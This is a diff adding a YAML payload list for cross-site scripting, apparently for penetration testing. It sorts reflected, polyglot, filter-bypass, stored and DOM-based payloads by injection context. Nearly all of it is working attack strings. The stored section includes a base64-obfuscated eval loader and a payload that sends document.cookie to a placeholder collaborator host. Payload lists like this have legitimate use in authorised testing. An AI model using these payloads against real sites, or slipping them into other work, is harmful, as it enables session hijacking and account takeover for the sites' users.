@@ -1,0 +1,29 @@
+name: XSS Payloads
+description: Curated XSS payloads organized by context
+
+reflected:
+  basic:
+    - "<script>alert(1)</script>"
+    - "<img src=x onerror=alert(1)>"
+    - "\"'><script>alert(1)</script>"
+  polyglot:
+    - "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
+  filter_bypass:
+    - "<ScRiPt>alert(1)</ScRiPt>"
+    - "<script>alert`1`</script>"
+    - "<svg/onload=alert(1)>"
+    - "<%2fscript><script>alert(1)</script>"
+
+stored:
+  - "<img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7 onerror=eval(atob(this.id))>"
+  - "<svg onload=fetch('https://YOUR-COLLABORATOR/'+document.cookie)>"
+
+dom:
+  - "javascript:alert(document.domain)"
+  - "#\"><img src=/ onerror=alert(2)>"
+  - "'-alert(document.domain)-'"
+
+notes: >
+  Prefer the interactsh callback domain over alert() when testing blind/stored
+  sinks so the OOB monitor can attribute the hit. Never use a payload that
+  writes to a third party outside the target's own scope.
